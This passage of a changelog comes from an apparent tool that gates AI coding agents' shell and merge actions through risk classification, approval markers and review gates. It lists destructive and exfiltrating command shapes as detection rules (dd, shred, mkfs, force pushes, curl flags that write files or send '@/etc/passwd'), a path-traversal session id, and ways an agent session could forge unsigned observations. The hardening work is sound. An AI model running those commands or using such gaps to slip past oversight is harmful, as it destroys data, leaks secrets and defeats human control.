  - Docs: `docs/risk-gate.md`'s curl section rewritten for the round-2 posture (the hardening history with its curl-8.7.1 ground truth, the updated shape, the residuals, and the operator escape hatch), the destructive-floor's `low` recognized-shapes row updated, and the "Unclassified actions" section's curl paragraph updated to name the mandatory `-q`. `docs/examples/full-manifest.yaml`'s curl comment updated to match. `docs/okf/quote-model-divergence.md` gains a fourth shell-word-model entry for `splitCurlWords` (previously undercounted as "three independent shell-word models").
  - **Round 3 (adversarial review of round 2's own shipment) pinned three round-2 properties that shipped without discriminating coverage, and fixed the round-2 doc/comment claims that had drifted from the round-2 code.** No grammar change: `isReadOnlyCurlCommand`'s accepted language is unchanged.
    - **Tests**: two negative fixtures pin that `-q`/`--disable` must be the SECOND word, not merely present anywhere (`curl -s -q '<url>'` and `curl '<url>' -q`); a third pins that curl's own leading-cluster honoring of `-q` (`-qs`) is a deliberate divergence this floor does not follow. Three new pins in `tests/runtime/read-only-bash.test.ts` cover the `\r` clause in the shared `hasUnsafeShellMetachar` preamble directly for `isReadOnlyBashCommand`, `isReadOnlyBashPipeline`, and `isReadOnlySedCommand` (previously exercised only through curl-specific fixtures, leaving the other three consumers of the shared guard unpinned for this property). A new positive fixture pins `-H ' @/etc/passwd'` (leading space, not `@`-prefixed after quote-stripping): measured against curl 8.7.1 against a local echo server, curl sends NO header at all for a value that fails its own `Name: Value` syntax, so this floors `low` correctly rather than by accident.
    - **Dead-code removal**: `isAllowedCurlFlagValue`'s own `\n`/`\r` rejection for a `-H` value was unreachable -- `hasUnsafeShellMetachar`'s whole-command guard already refuses either character anywhere in the command before any word is split out -- so it was removed, keeping only the `` ` ``/`$` check there. No behavior change: `hasUnsafeShellMetachar` refuses both characters for the whole command before any word is split out, and `command.trim()` can only strip a leading or trailing one, never one inside a quoted value; the round-3 reviewer confirmed this with a 63-spelling differential run against a build with the clause restored.
    - **Mutation probes** (each applied, run, and reverted): accepting `-q`/`--disable` anywhere instead of only as the second word turns the two new position-guard fixtures red; removing `\r` from `hasUnsafeShellMetachar` turns the three new `read-only-bash.test.ts` pins red AND the pre-existing curl-CR pin in `read-only-floors.test.ts` red (confirming that pin's load-bearing guard moved entirely onto the shared preamble once the redundant per-value check was removed); accepting a `-qs`-style leading cluster as satisfying the second-word check turns only the dedicated `-qs` fixture red, none of the others.
    - **Docs**: `docs/risk-gate.md`'s curl section corrected in several places that had drifted from the round-2 code: the "proven incapable of naming a file or a method" claim now says explicitly that HEAD is the one method the allowlist selects, not "no method" (curl's `-I`/`--head` does select HEAD, which is read-only); the whole-command-guard bullet now names `isReadOnlyBashPipeline` as the one exception (it keeps its own narrower reject set so a bare `|` stays admissible, rather than reusing `hasUnsafeShellMetachar`); the header-value carriage-return paragraph no longer claims `\r` is "refused twice over" now that the redundant per-value check is gone, and now says the whole-command guard's `\r` forfeit exempts only leading/trailing whitespace (stripped by `command.trim()` first); the operand-shape bullet's "closes the most common read-only spelling" claim is narrowed to single-parameter query strings, with a new Residuals entry naming that a `&`-joined multi-parameter query string still forfeits even single-quoted (the shared whole-command guard is quote-unaware by design; making it quote-aware for this one floor was out of round 2's scope and stays out of round 3's). `CHANGELOG.md`'s round-2 entry's claim that the shared write-guard predicate `isReadOnlyBashCommand` "is untouched and stays byte-identical" is corrected: its own body is unchanged, but its shared `hasUnsafeShellMetachar` preamble gained the `\r` clause, so it (and `isReadOnlyBashPipeline`, `isReadOnlySedCommand`, `isReadOnlyKubectlCommand`) is now strictly MORE restrictive for a bare carriage return than before round 2, not byte-identical. `docs/examples/full-manifest.yaml` and `docs/okf/debug-verb-selection.md` get the same "no file, HEAD is the one selectable method" correction. `hasUnsafeShellMetachar`'s own docstring in `read-only-bash.ts` is corrected: it is shared by `floorArgv` (`isReadOnlySedCommand`'s own preamble, `floorArgv`'s only caller since D-013), and consumed DIRECTLY by `isReadOnlyCurlCommand`, not through `floorArgv` as the comment previously implied. `CURL_WORD_SEPARATOR_RE` and its comment moved above `splitCurlWords`'s own docstring so each JSDoc block sits on the symbol it documents, and the curl constants'/functions' "measured against curl 8.7.1" clauses now point at `docs/risk-gate.md`'s curl section (which keeps the measurement) instead of repeating it inline.
  - **Round 4 (review of round 3) moved the `@` header-value check onto the shape**: `isAllowedCurlFlagValue` now trims leading whitespace before testing for `@`, so `-H ' @/etc/passwd'` (and the tab spelling) forfeits instead of flooring `low`. Round 3 had pinned that spelling as a positive because curl 8.7.1 drops such a header unsent; that made the ALLOW decision rest on curl's own header parser, the version-skew failure mode this floor exists to avoid. Two negatives replace the positive, and the long spellings `--location`/`--insecure` gain their own negatives next to `-L`/`-k` (a mutant re-admitting only the long forms shipped green before). Strictly more restrictive than round 3; no other grammar change.

- **`verifyDelegation` now gives an absent conventional launcher report its own dedicated `report_missing` reason, distinct from `report_path_mismatch` and `report_content_mismatch`** (agent-tasks `204efc56`, follow-up to `49d1ee41`). Previously an absent `harness.generated/.delegation-reports/<child-sid>.md` surfaced as `report_content_mismatch` (or, non-deterministically under a symlinked temp root such as macOS `os.tmpdir()`, `report_path_mismatch`), which told the operator the report was wrong rather than that it did not exist. In the shipped hook channel the conventional path is derived from the child session id on both sides, so a report moved or renamed away from that path also yields `report_missing`, not a distinct "moved" reason; `report_path_mismatch` is reachable only through a resolvable symlink sitting at the conventional path (caught by the path-hash comparison, since a symlink answers `present` to the existence probe) or through the no-report-path-offered branch, and `report_content_mismatch` covers everything present but wrong: bytes that do not match the bound hash, an unreadable file, a dangling symlink, or a directory.
  - `DelegationRefusalReason` (`src/policy-packs/builtin/understanding-before-execution/delegation-markers.ts`) gains `report_missing`. A stat-only existence probe (`probePathPresence`, `src/io/read-regular-file.ts`) runs BEFORE the path hash: existence is decided independently of `hashDelegationCwd`'s missing-path fallback (`path.resolve`), so a symlinked temp root can no longer flip the reason. This is a bare `lstat`, not a read: a resolvable symlink or a directory answers "present" and falls through, so a resolvable symlink is still caught one step later at the path-hash comparison (`report_path_mismatch`), and only a dangling/looping symlink or a directory reaches the single full read (`readRegularFileRejectingSymlink`, still after the path hash and the content-hash presence check pass) and is refused there (`report_content_mismatch`). The ok path still hashes and returns one set of bytes exactly as before; the only change is one extra `lstat` call ahead of it, not an extra read. `src/io/read-regular-file.ts`'s reader and probe now share one `lstatOrNull` helper holding the single `fs.lstatSync` try/catch, so the two exports' doc comments' "same lstat call" claim is literally true; `probePathPresence` is the probe's name (renamed from `probeRegularFilePresence`, which over-promised: it answers "present" for a symlink or a directory too, not just a regular file).
  ...
  - Docs: `docs/decisions/2026-08-27-ug-auto-mode-approval.md` (the launcher-report-channel paragraph now names the state each of the three reasons covers, not a moved/content-modified pairing), `docs/policy-packs/understanding-before-execution.md` (the `--report` fallback-shape paragraph does the same), `docs/okf/evidence-ledger-trust-boundary.md` (the shared-reader paragraph names the one shared `lstat` helper and its consumers).
  - **Tests**: `tests/policy-packs/understanding-before-execution-delegation.test.ts` pins `report_missing` on a never-written report (both a non-realpathed and an explicitly realpathed temp root) and on a report STAGED then deleted before verify (a symlinked temp root, where the bind-time and verify-time path hashes would otherwise disagree); a SYMLINK and a DIRECTORY at the conventional path each pin the negative (`expect(result.reason).not.toBe("report_missing")`), landing on `report_path_mismatch` and `report_content_mismatch` respectively; a hand-signed half-binding (report path bound, no `reportContentHash`, a shape `writeDelegationMarker` itself refuses to produce) with an absent file pins `report_missing` over `report_content_mismatch`. Also added: a read-order fixture pinning that the full read never happens before the path hash on a mismatch, a call-count fixture pinning exactly one full read on the ok path, an EACCES-containing-directory fixture (`report_missing`, skipped under root or on Windows), and a DANGLING-symlink fixture pinning `report_content_mismatch` (not `report_missing`, not `report_path_mismatch`). `tests/io/read-regular-file.test.ts` gained direct `probePathPresence` coverage (regular file, resolvable symlink, dangling symlink, directory, absent path each classified, plus a fixture pinning that the probe performs no read). `tests/cli/pack-hook-pre-tool-use-delegate.test.ts` case (w) (moved/absent conventional report) now expects `report_missing` instead of the previous `report_content_mismatch`. Mutation probes: removing the existence check (restoring the fall-through straight into the path-hash comparison) turns the new report_missing-pinned tests red; hoisting the full read above the path hash turns the read-order and call-count fixtures red; making the shared `lstat` helper return null for a symlink turns the symlink fixtures and the new probe tests red. Restoring each turns its fixtures green again.

### Security

- fast-uri 3.1.7 in the lockfile (transitive under ajv), closing GHSA-5jgf-p345-68v8, GHSA-f65p-4m7j-42xc, GHSA-fph4-wmhf-6fwf, and GHSA-jqff-g426-hqxp (#495).
...
- **The child's PreToolUse hook now consumes the launcher-supplied Understanding Report the `--report` fallback shape of `harness delegate` mints** (agent-tasks `49d1ee41`, follow-up to UG auto-mode slice 3, agent-tasks `37ad0b05`). Previously `harness delegate --report <path>` minted a fully signed, verifiable delegation, but the child's hook never passed `verifyDelegation` a `launcherReportPath`, so every report-bound delegation was refused (`report_path_mismatch`) unconditionally and the transcript scan was the only report channel this release actually acted on, documented in the pack doc as "issued and verifiable, not yet consumed".
  - **Conventional path channel.** `delegationReportPathFor` (`src/policy-packs/builtin/understanding-before-execution/delegation-markers.ts`) derives `harness.generated/.delegation-reports/<child-sid>.md` from nothing but the child session id, which `harness delegate` already takes as a required argument at delegation time. `harness delegate --report <path>` copies the operator's file there (mode 0600), refusing (new reason `report-conflict`, distinct from `report-unreadable`) rather than silently overwriting a DIFFERENT file already staged for the same child session; an identical restage is a no-op. The `report=` segment of the signed `approvedBy` string, and `reportContentHash`, now bind THIS conventional copy (its realpath and its bytes), not the operator's original `--report` argument, since the child's hook has no channel to learn an arbitrary operator-chosen path.
  - **Hook side.** `src/cli/pack/hook-pre-tool-use.ts` offers the conventional path to `verifyDelegation` unconditionally on every delegation check (a no-op for a delegation that binds no `report=` segment). On success, a report-bound delegation (`verified.reportPathHash !== undefined`) skips the transcript scan entirely and instead reads the conventional file, adopts it once via the SAME once-per-session `.delegation-adoptions/<child-sid>` ledger the transcript scan uses, keyed by the report's CONTENT hash, namespaced `report:` so the id shapes can never collide with the scan's `uuid:`/`digest:` ids, and persists it `pending` through the same `persistStdinReport` path, for the auto path below to consume exactly as it consumes a transcript-captured report. A missing, moved, or content-modified file at the conventional path blocks through the verifier's existing distinct reasons (`report_path_mismatch` / `report_content_mismatch`); no new refusal reason was added on the read side, and the special-cased "not yet consumed" stderr wording was removed.
  - **Adoption-once, verified for real.** Mutation probe 1: disabling the once-per-session adoption check (`adopted.ids.has(entryId)`) turns the new "(r2) ... cannot mint a second marker from the SAME launcher report once the first expired" test red; restoring the check turns it green again. Mutation probe 2: disabling the verifier's content-hash comparison (`actualContentHash !== boundContentHash` inside `verifyDelegation`) turns the new "(w2) ... whose CONTENT was modified" test red, since nothing then stops a modified conventional file's stale hash from minting; restoring the comparison turns it green again. A round-2 fix added a third probe: `verifyDelegation` now returns the exact bytes it verified (`reportContent`) and the hook persists THOSE bytes instead of re-reading the file, closing a verify-then-persist race. Restated in round 3 to name what actually discriminates: appending trailing text to the persisted markdown is dropped by the parser and leaves the probe green, so mutation probe A2 instead alters a PARSED section (`currentUnderstanding`) before persist, which turns the "(w3) ... report-bound delegation" test red; restoring the unmodified bytes turns it green again. The "reintroduces a second, unchecked read" half is pinned by its own dedicated test added in round 3: "(w4) pins the single-read persist path" (`tests/cli/pack-hook-pre-tool-use-delegate.test.ts`) mocks the conventional file's reader to hand back the bound bytes on the first read and tampered bytes on any read after that, so a regression that re-reads the file lands the tampered content in the persisted report and turns (w4) red; restoring the single-read path (`reportContent = verified.reportContent`, no second read) turns it green again.
  - **Tests** (`tests/cli/delegate.test.ts`, `tests/cli/pack-hook-pre-tool-use-delegate.test.ts`): the conventional copy's mode/content/path binding, the `report-conflict` refusal and its idempotent-restage counterpart, hook cases for happy path (adopted, persisted pending, marker minted, transcript never scanned), a moved (absent) conventional file, a content-modified conventional file, second-call-after-marker-expiry adoption (the once-per-report mint), and confirmation that an unbound/cwd-task-only delegation is unaffected (the existing suite's negative controls, unchanged).
  - Docs: `docs/decisions/2026-08-27-ug-auto-mode-approval.md` ("Amendment: the launcher-report channel is consumed by the child hook"), `docs/policy-packs/understanding-before-execution.md` (the `--report` fallback-shape paragraph and a "Cleanup" residue sentence for `.delegation-reports/`, not yet gc'd, folded into gc follow-up task `3ece079d`), `docs/CLI.md` (the `delegate` row), `docs/okf/understanding-gate-auto-mode-signals.md` ("Verdict (iv), interactive": the fallback channel is now live).

- **The review-before-merge gate now covers `mcp__agent-tasks__task_merge` and `mcp__agent-tasks__task_finish` (`autoMerge`), via a new `trigger.input_match` predicate** (task `2699b476`). Closes the residual the 99f47307 Slice 1 entry named twice below (round-2 F4 and the round-3 residual list, entry (c)): only `pull_requests_merge` and `gh pr merge` were gated, so the two task-scoped verbs that also land a PR passed with "no policy matched event".
  - **New trigger field `trigger.input_match`** (`src/schema/policies.ts`, `src/schema/extract.ts`): a map from a `toolArgs.`-namespaced extract expression (same grammar and parser as `trigger.extract`) to a `string`/`number`/`boolean` literal, ANDed onto the other trigger fields and compared by STRICT equality (same JSON type and value). A missing path never matches, an empty map is a validation error, and a non-`toolArgs` namespace is rejected at parse time with a message naming the namespace, so a typo like `event.autoMerge` is a loud error rather than a predicate that quietly never fires. The check lives in `PolicyTriggerSchema`, the same layer `bash_match` / `path_match` are declared at, so `validate`, `apply`, `doctor`, `loadManifest` and the intercept entrypoint all refuse the bad shape. This is what separates the merging mode of `task_finish` (`autoMerge: true`, both the soloMode work claim and the review claim + approve) from the ordinary one, which merges nothing and stays uninterceptable.
  - **Evaluated once, read twice.** `firstInputMatchMismatch` (`src/io/extract.ts`) is called by `policyMatchesEvent` (`src/runtime/intercept.ts`) and by dry-run's `policyMatchesTool` (`src/cli/dry-run.ts`), so `harness policy dry-run` predicts exactly what `policy intercept` decides, keeping the parity contract `docs/okf/debug-verb-selection.md` records. A non-matching payload comes back in the "could match" bucket naming the failing entry and both values. Fail direction on an unparseable expression (only reachable from a hand-built `Manifest`): the entry is treated as HOLDING, so the gate stays armed rather than silently excusing the call.
  - **Two new shipped policies plus their hooks**, in `FULL_TEMPLATE`, `TEAM_TEMPLATE` and `docs/examples/full-manifest.yaml`: `review-before-task-merge` (`match: mcp__agent-tasks__task_merge`) and `review-before-task-finish-automerge` (`match: mcp__agent-tasks__task_finish`, `input_match: { toolArgs.autoMerge: true }`), both extracting `TASK_ID: toolArgs.taskId` and requiring `review:${TASK_ID}`. Each gets its OWN hook (`require-review-evidence-task-merge` / `require-review-evidence-task-finish`) because a hook's `match` is what `harness apply` projects into settings.json's tool-name matcher: a matcher for `pull_requests_merge` never spawns `harness policy intercept` for either verb. An existing install picks these up only by re-running `harness init` / `harness apply`.
  - **Derivation parity.** `src/runtime/workflow-policies.ts` derives the same two policies from a qualifying `workflows:` entry, structurally identical to the shipped ones apart from name and description (pinned by the parity assertion in `tests/runtime/workflow-policies.test.ts`, now covering all four gates, and for the two new ones also their `producers:` / `ux:`). Each is derived ONLY when its own hook is declared: a derived gate whose hook is not wired into settings.json would never be invoked and would read as enforced while doing nothing, the same "No-Op that LOOKS protective" shape `checkWorkflowGateWiring` exists to prevent. A manifest predating the two hooks therefore derives exactly the pair it always did, and `hasWiredMergeGateHooks` is unchanged. `trigger.input_match` also joined `triggerSurfaceKey`, so a hand-authored policy that gates a DIFFERENT `autoMerge` value no longer dedupes the derived gate away.
  - **Producer.** `harness record review` grew an optional `--task <id>` that appends `review:<task-id>` to the same single fact it already writes (`review:<pr>` + `review:<branch>` + `review:<base>`), so one `harness record review --pr <n> --task <id> "<summary>"` satisfies all four merge gates. The id is validated loosely (non-empty, no whitespace); a value with internal whitespace is rejected because it would split into two tags in the fact content and satisfy a gate keyed on the first half.
  - **Verification.** Intercept-level allow/deny coverage runs through the real `runInterceptCli` entrypoint (`tests/runtime/intercept-cli-workflow-gate.test.ts`): deny with an empty ledger and allow with the recorded fact for both verbs; a plain `task_finish`, `autoMerge: false`, and `autoMerge: "true"` (string) each pass with NO decision recorded at all; a `task_merge` with no `taskId` in the payload denies as `deny-degraded` rather than allowing; a manifest carrying both the hand-authored gate and the derivation evaluates exactly one policy per call. Mutation probes (each applied, run, and reverted): making the `input_match` evaluation unconditionally true turns the three not-intercepted tests red; dropping the task_merge policy from the derivation turns the parity test red; dropping the `input_match` arm from dry-run's `policyMatchesTool` turns the dry-run parity fixture red; dropping `input_match` from `triggerSurfaceKey` turns the two surface-key dedupe tests red.
...
- **Permission-mode observation stays unsigned; the decision and its threat-model reasoning are now recorded in the ADR** (agent-tasks `a4ceb6be`), not just a review-round changelog note. `docs/decisions/2026-08-27-ug-auto-mode-approval.md` gained the "Amendment: permission-mode observation stays unsigned" section: signing the hook-written observation would only prove the hook signed the record, not that a session actually ran under the claimed permission mode, and it would open a second, unconditional signing surface for the marker-signing key (not a path to mint an approval marker, which stays namespaced by markerId), the exact widening the ADR's threat model already names as a residue. The `harness doctor` finding's message now names the evidence honestly ("hook-written, unsigned self-report; confirm from your own launch settings before enabling auto_approve"), and `permission-mode-observations.ts`'s and `bypass-without-auto-approve.ts`'s module headers, plus `docs/policy-packs/understanding-before-execution.md`, point at the ADR paragraph instead of leaving the older "possible future hardening" framing standing. No behavior change: the observation was already unsigned and the finding was already advisory-only.
...
- **`claude -p` delegation (slice 3) is decided Claude Code only on the consuming side, and the platform boundary is now documented rather than left implicit** (agent-tasks `be9faf70`). Consumption only: the Codex adapter has no delegation consumer, so a Codex session cannot be the delegated child; a Codex session holding a validly signed marker can still issue a delegation for a Claude child today, an accepted consequence of the shared marker contract (see the ADR's Platform scope amendment). The Codex adapter already shares slice 2's `permission_mode`-based auto-approval, but carries no delegation-marker consumer; a Codex-shaped port would need its own measured child-report capture channel and delegation verifier, not a code port of the three Claude-side pieces. Recorded as a "Platform scope" amendment to `docs/decisions/2026-08-27-ug-auto-mode-approval.md` with a reopen criterion, gap 14 in `docs/okf/codex-adapter-parity-gaps.md`, and the boundary named in the pack doc, `docs/CLI.md`, and the `harness delegate` `--help` text.

### Fixed

- **An unclassified action no longer satisfies `risk.severity_at_least: critical` on its own** (agent-tasks `2929c5b7`). It still satisfies `low`/`medium`/`high` (`risk.category_in` and `action.reversible` keep the full "unknown is not safe" fallback unchanged), but the top tier now requires a real classification: `evaluateWhen` (`src/runtime/when-eval.ts`) treats an unclassified profile as sitting one rung below the top of the severity scale ("high" on the shipped four-value scale) for `severity_at_least` comparisons only. No manifest opt-in restores the old blanket behavior; see `docs/risk-gate.md`'s "Unclassified actions and the fail-close rule". Motivation, measured on a production-resolved session: six consecutive read-only investigation commands (`cat`, `sed -n`, `curl`, `sshpass ssh`, `node -e`, `git -C ... rev-list`) were hard-denied by the shipped `gate-prod-destructive` policy, because none of them were classified and the old blanket rule let each one satisfy `severity_at_least: critical` exactly as `rm -rf /` would.
  - **A built-in DESTRUCTIVE floor ships in the binary, so existing installs keep the hard block.** `src/runtime/destructive-shell-floor.ts`, composed in `classifyRisk` under the same highest-severity-wins rule as the existing floors. `harness init` writes a manifest once and never rewrites it, so shipping the compensating classification only as new `dangerous-shell` template patterns would have left every EXISTING manifest with the loosened fallback and no replacement. The floor classifies `critical` for `dd` with an `of=` target, `truncate -s` (glued `-s0` included), `shred`, `mkfs`/`mkfs.*`, `find ... -delete`, `find ... -exec(dir) rm`; `high` for `git reset --hard`, `git push --force`/`--force-with-lease`/`-f`/`+refspec`, `git clean -f` (cluster-aware), `git checkout .`, `git checkout -- .`, `git restore .`, `chmod`/`chown -R` (cluster-aware), `sed -i`, and `curl` carrying a local-write flag (`-o`, `-O`, `-D`, `-c`, `-K`, `--config`, `--output`, `--trace*`, `--create-dirs`, ...) or a body/method flag (`-d`/`--data*`/`--json`/`-F`/`--form*`/`-T`, or `-X`/`--request` naming anything but GET/HEAD). Since curl has no read-only floor to fall back on, its write-capable surface is recognised here as far as this argv-text scan can see it: `-w`/`--write-out` whose format string carries curl 8.3.0's `%output{FILE}` directive also counts as a local write (a format string itself read from a FILE, `-w @fmt.txt`, is a documented gap this scan does not close), and a local file read into the outgoing request classifies `high` with `network_exfiltration` alone, which keeps that profile `reversible: true`: `-H`/`--header` with a value starting `@`, or `-b`/`--cookie` with a value containing no `=` (curl's own rule for `-b`, `@`-prefixed or not — fix round 5 corrected this scan's earlier `-b @FILE`-only model to match). `shred`/`mkfs` are matched on their head token alone and so gained one exemption: an invocation whose ONLY argument is `--help`/`--version`/`-h`/`-V`/`-v`, which cannot destroy anything (`shred -v secret.txt` keeps its `critical`). It resolves the real head through path prefixes (`/bin/dd`), `VAR=`/`env`/`command`/`sudo`/`nice`/`timeout`/`exec`/`nohup` wrappers (reusing `peelWrapperPrefixes`), `busybox`, and `sh -c "..."` / `bash -lc '...'`, none of which a raw-string regex can follow. An operator pattern can raise above it; nothing sinks below it.
  - **The `dangerous-shell` template patterns are that floor's operator-editable mirror**, kept in `FULL_TEMPLATE` and `docs/examples/full-manifest.yaml` (lockstep guard: `tests/cli/init-full-template-parity.test.ts`), and tightened this round: `truncate` now matches the glued `-s0` form, `chmod`/`chown` is short-cluster-aware like `git clean`'s pattern, the `curl` body pattern covers `--json`/`-F`/`--form`/`--form-string` and any `-X`/`--request` method other than GET/HEAD in any letter case, and a third `curl` pattern covers the local-write flags (`-o`/`-O`/`-D`/`-c`/`-K` in a cluster, the long spellings, and `-w`/`--write-out` with `%output`). The mirror stays narrower than the floor for the `@FILE` value on `-H`/`-b`, whose `@` a raw-string pattern cannot tell from an `@` anywhere else in the line. `tests/runtime/destructive-shell-floor.test.ts` pins that every template pattern's canonical spelling is also caught by the built-in floor, at the same severity or higher.
  - **The `sed` read-only floor is ALLOWLIST-based and Risk-Classifier-only; `curl` deliberately gets NO floor.** `isReadOnlySedCommand` sits beside `isReadOnlyKubectlCommand` in `src/runtime/read-only-bash.ts` and is wired only into `classifyRisk`, deliberately NOT into the shared `isReadOnlyBashCommand`: the understanding-gate PreToolUse blocker and the solution-acceptance write-guard consume that predicate directly and return "allowed" for anything it accepts before their own checks run, so a `sed` recognition there widens both gates. `sed` floors to `low` only when every flag is on the read-only allowlist (so `-i` in every spelling and `-f SCRIPTFILE` forfeit) and every script parses as a read-only sed program: sed's `w` command, the `s///w` flag and GNU's `e` command/flag all forfeit, correcting this task's earlier claim that "without `-i`, sed only writes to stdout". **`curl` has no read-only floor at all** (decision D-013): two shipped and both leaked, first a write-flag denylist that missed `-o`/`-O`/`-D`/`-c`/`-K`, then a flag allowlist that still admitted `-w`/`--write-out`, whose `%output{FILE}` directive writes a local file from curl 8.3.0 onward (verified on curl 8.7.1). The recurring class is the premise rather than the list: deciding a curl invocation is inert needs every curl flag's write capability across curl versions, and the value side has the same problem (`-H @FILE`). `curl` therefore stays UNCLASSIFIED like `ssh` and `node -e` (approval-gated by the fallback, never hard-blocked, never floored), and only its write-CAPABLE spellings are named, by the destructive floor. Operators who want a specific curl shape exempt add an explicit `low` classifier pattern for it, or a network egress control. A bare truncating redirection (`> file`) stays a documented, NOT-closed gap: the classifier is regex-over-raw-string with no redirection model, and a heuristic for it would over-match `2>&1`, heredocs and comparison operators.
  - **`ssh <host> <cmd>`, `node -e`/`--eval` and `curl` are NOT given a `low` floor.** For `ssh` and `node -e` the payload (the remote command, the evaluated code) is opaque to the classifier; for `curl` it is the flag surface that cannot be allowlisted robustly (see the floor bullet above), so a `low` floor there would drop Risk Gate coverage entirely for those shapes: neither `severity_at_least: critical` nor `severity_at_least: high` fires on a `low` action. All three stay genuinely unclassified instead, so the paired `evaluateWhen` fallback above already covers them: not hard-blocked by a production `severity_at_least: critical` gate, but still approval-gated by a production `severity_at_least: high` gate.
  - **The `ux:`-declared deny envelope now names a fallback-caused deny**, not just the neutral non-`ux:` one, and interpolates the resolved environment name, the fallback rung, and the policy's own declared threshold, so an unscoped `severity_at_least: high` policy on a feature branch no longer reports a production context that was never resolved or a critical-severity comparison that never ran. The operator's own `cannot:` text is appended byte-for-byte, and a genuine classification hit still renders it with no prefix.
  - Docs: `docs/risk-gate.md` ("Unclassified actions and the fail-close rule", "Built-in read-only commands", the `sed` read-only floor, the new "No `curl` read-only floor, by design" section, and the built-in destructive floor section, which now also records the head-resolution spellings the floor does not reach and the fact that a floor classifies — retiring the unclassified fallback for `risk.category_in` and `action.reversible`, not just `risk.severity_at_least` — whether the floor's own category list is empty (the benign floors) or non-empty but narrower than a policy might assume (the destructive floor: `chmod -R` classifies `mass_update` only, a curl request body classifies `production_mutation`+`network_exfiltration` but never `destructive`).
...
- **Understanding gate: `auto_approve` now ships active in every `harness init` template, and existing installs get an upgrade path and a doctor warning** (task `8f637efd`, D-004, `docs/decisions/2026-08-27-ug-auto-mode-approval.md`, "Amendment: install default"). Origin: observed 2026-08-29 on the Mac mini install (harness 0.51.0 global, `understanding-before-execution` pack active, session running under `bypassPermissions`): after the 4h `approval_lifecycle` expired, the gate required a fresh Understanding Report, `harness approve understanding` resolved via the manual `permissionDecision: ask` path, and the operator had to confirm a prompt by hand; `harness doctor` reported "auto approvals in the last 20 sessions: 0". Root cause: `~/.harness/harness.yaml` had never carried an `auto_approve` block, because no init template shipped one (`grep -rn auto_approve src/cli/init` returned nothing before this change), and there was no upgrade path for an install that predated the block.
  ...
  - New `harness doctor` advisory (`src/cli/doctor/bypass-without-auto-approve.ts`): warns when `bypassPermissions` was observed for a session and `auto_approve` does not cover it. The observation is written by the hook process from the PreToolUse payload, not from a ledger row or report field the agent writes through its own API, under `harness.generated/.permission-mode-observations/` (`src/policy-packs/builtin/understanding-before-execution/permission-mode-observations.ts`), independent of whether `auto_approve` is configured. It is NOT signed (review round 3, F2): it is evidence the hook was invoked with a given payload, not proof a session actually ran under that mode, so an already-approved session (or anything else able to invoke the hook binary directly) can write, or forge, one; the finding stays advisory-only for exactly that reason and never gates or mints an approval.
  ...
  - **Review round 2 fixes.** A shared `readJsonDirEntriesRejectingSymlinks` helper (`src/io/read-json-dir-entries.ts`) replaces the verbatim readdir-classify-parse loop `ug-auto-approvals.ts` and `permission-mode-observations.ts` had each grown independently. `harness init --interactive`'s Custom composer now also ships `auto_approve` (it had been the one template-shaped surface this default missed, since it builds a config object rather than YAML text). `harness pack upgrade understanding-before-execution` now accepts a double- or single-quoted `- name: "understanding-before-execution"` pack entry and preserves a CRLF manifest's line endings end to end instead of inserting bare-LF lines. The doctor finding's `harnesses` coverage leg (previously untested) now has a discriminating test. `harness gc` grew a fourth mtime-aged category, `permission-mode-observation`, sweeping `harness.generated/.permission-mode-observations/` the same way it already sweeps `.approvals/`.
  - **Review round 3 fixes.** F1 (HIGH): `permissionModeObservationPathFor` had joined `session_id` into the write path unvalidated (trusting the caller's own empty-string check), so a crafted `session_id` reaching `harness pack hook pre-tool-use` on stdin (e.g. `../../escape-target/victim`) could write a file outside `harness.generated/.permission-mode-observations/`; it now calls the same `rejectMalformedSessionId` the approval marker path uses, and a rejected id is treated as another best-effort write failure (one stderr warning, fail-open, never a throw out of the hook). The read side (`listPermissionModeObservations`) now runs every returned `sessionId` through a `sanitizeForDisplay` step (mirrors `persisted-reports.ts`'s `sanitizeDetailValue`: strips C0/DEL control characters including ESC, caps length) before it can reach `harness doctor`'s finding `message`, since a hostile on-disk entry name or JSON `sessionId` field is not otherwise constrained to be display-safe. Mutation probe M1: dropping the `rejectMalformedSessionId` call from `permissionModeObservationPathFor` turns 5 tests red (`tests/policy-packs/understanding-before-execution-permission-mode-observations.test.ts`, `tests/cli/pack-hook-pre-tool-use-permission-mode-observation.test.ts`); restored, all green.
  - **Review round 4 (verification) fixes.** The ADR amendment's one remaining "non-agent-writable" phrase was aligned with the unsigned/advisory wording used everywhere else; `observedAt` is display-sanitised alongside `sessionId` (in the reader and again at the finding's render boundary, mirroring `persisted-reports.ts`), because V8's date parser accepts parenthesised trailing text so a crafted timestamp passed validation and reached `harness doctor` raw; the hook's own stderr warning sanitises the echoed session id; the hook-level traversal test now pins the concrete verdict (`blocked === true`) instead of a type check; the duplication pin follows the measured 112; and the broadened `auto_approve:` presence match documents its block-scalar limit (fail-safe no-op).
  - F2 (MEDIUM): corrected the "hook-written, not agent-writable" framing above and in `permission-mode-observations.ts`'s and `bypass-without-auto-approve.ts`'s module headers and `docs/policy-packs/understanding-before-execution.md`: the observation is unsigned, so it proves the hook was invoked with a payload, not that a session ran under a given mode; the finding stays advisory-only and never gates. Not signing the observation in this task was an orchestrator decision (D-013): a second signed artifact would widen the marker-signing surface the ADR already lists as a residue, and the finding is advisory. Signing the observation was subsequently decided against; see the unsigned-observation entry in this section and the ADR amendment.
  - F3 (MEDIUM): `harness pack upgrade`'s `auto_approve:` presence check used strict line equality, so a hand-applied flow-style value (`auto_approve: {when: [...], ...}`) or a bare key with a trailing comment was not recognized as present; the verb inserted a second key and `parseYaml` threw "Map keys must be unique" uncaught (exit 70, a raw YAML message). The check now matches any line whose trimmed form starts with `auto_approve:`, and both `parseYaml` call sites (pre-lock and under the lock) are wrapped so a still-unparseable proposal surfaces as this verb's own `HarnessExitError` at `EX_FAIL` naming the pack, instead of an uncaught exception. Mutation probe M3: reverting the presence check to strict equality turns the two new flow-style/trailing-comment tests in `tests/cli/pack-upgrade.test.ts` red; restored, all green (22/22).
  - F4 (LOW): `packUpgrade` reported `applied: true` unconditionally after the locked callback ran, even when the callback found the block already present (a concurrent writer had raced it) and returned without writing. The callback now sets a `wroteUnderLock` flag only when it actually calls `atomicWriteFile`, and the result reports `applied: false, alreadyPresent: true` on the raced path. Covered by a real (unmocked) concurrency test in `tests/cli/pack-upgrade.test.ts`: two `packUpgrade` calls on the same fresh manifest via `Promise.all`, asserting exactly one reports `applied: true` and the manifest ends up with exactly one `auto_approve:` key.
  - F5 (LOW): dropped "task 8f637efd" from the `harness pack upgrade --description` help string and the pack doc's section heading; kept in source comments and here.
...
